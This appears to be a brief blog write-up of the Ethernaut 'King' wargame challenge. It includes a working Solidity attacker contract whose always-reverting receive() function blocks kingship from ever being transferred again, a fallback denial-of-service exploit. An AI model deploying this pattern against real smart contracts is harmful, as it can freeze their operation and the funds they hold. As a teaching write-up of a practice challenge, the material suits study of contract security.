---
layout: post
title:  Ethernaut - King
categories: [pwnable.kr]
excerpt: Writeup for King.
---
# Ethernaut - King

This uses `cmichel`'s Ethernaut solutions repo as a template, hence the similarities.

# Initial insights

Immediately, we can see from looking at the contract that the contract _depends_ on the current king getting their ether back.
In paritcular, in the `receive()` function, `king.transfer(msg.value)` must pass in order for kingship to be transferred; we can use an age old DoS style fallback attack to claim kingship forever.

# The exploit

This is extremely short as the scope is just fallback DoS style:

```solidity
pragma solidity ^0.7.3;

interface IKing {
    function changeOwner(address _owner) external;
}

contract KingAttacker {
    IKing public challenge;

    constructor(address challengeAddress) {
        challenge = IKing(challengeAddress);
    }

    function attack() external payable {
        payable(address(challenge)).call{value: msg.value}("");
    }

    receive() external payable {
        require(false);
    }
}
```
